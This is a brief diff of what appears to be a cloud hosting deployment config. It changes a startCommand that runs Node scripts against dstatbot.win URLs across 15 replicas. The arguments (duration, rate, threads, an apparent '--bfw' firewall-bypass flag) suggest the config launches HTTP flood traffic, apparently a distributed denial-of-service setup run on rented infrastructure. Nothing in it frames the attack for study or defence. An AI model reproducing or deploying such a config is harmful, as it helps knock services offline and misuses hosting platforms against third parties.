@@ -3,6 +3,6 @@ builder = "NIXPACKS"
 
 [deploy]
 replicas = 15
-startCommand = "node y.js GET https://c1.dstatbot.win/LBRAqyoF  700 8 120 --bfw --debug "
+startCommand = "node m.js https://captcha3.dstatbot.win/Q0PLFzjP 700 1 16 1 "
 restartPolicyType = "ON_FAILURE"
 restartPolicyMaxRetries = 1
